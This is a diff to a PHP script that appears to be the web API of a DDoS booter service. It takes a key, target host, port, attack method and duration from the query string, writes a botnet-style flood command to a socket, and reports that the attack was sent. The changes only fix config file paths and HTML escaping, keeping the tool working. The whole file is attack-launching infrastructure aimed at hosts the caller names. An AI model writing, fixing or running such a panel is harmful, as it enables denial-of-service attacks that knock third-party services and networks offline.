@@ -1,13 +1,13 @@
 <?php
 
 // Read attack methods from attack-methods.config
-$attackMethods = file('/Config/attack-methods.config', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+$attackMethods = file(__DIR__ . '/Config/attack-methods.config', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 
 // Read API keys from api-keys.config
-$APIKeys = file('/Config/api-keys.config', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+$APIKeys = file(__DIR__ . '/Config/api-keys.config', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 
 // Read banned IPs from banned-ips.config
-$bannedIPs = file('/Config/banned-ips.config', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+$bannedIPs = file(__DIR__ . '/Config/banned-ips.config', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 
 function htmlsc($string)
 {
@@ -15,7 +15,7 @@ function htmlsc($string)
 }
 
 if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))
-    die("<p>You are missing a parameter");
+    die("<p>You are missing a parameter</p>");
 
 $key = htmlsc($_GET["key"]);
 $host = htmlsc($_GET["host"]);
@@ -39,9 +39,9 @@ if (in_array($_SERVER['REMOTE_ADDR'], $bannedIPs))
 // Generate attack command
 $command = "!* $method $host $port $time 32 1337 1";
 
-($socket ? null : die("<p>Failed to connect"));
+($socket ? null : die("<p>Failed to connect</p>"));
 
 fwrite($socket, $command . "\n");
 fclose($socket);
-echo "Attack sent to $host:$port for $time seconds using method $method!\n";
-?>
+echo htmlsc("Attack sent to $host:$port for $time seconds using method $method!\n");
+?>s
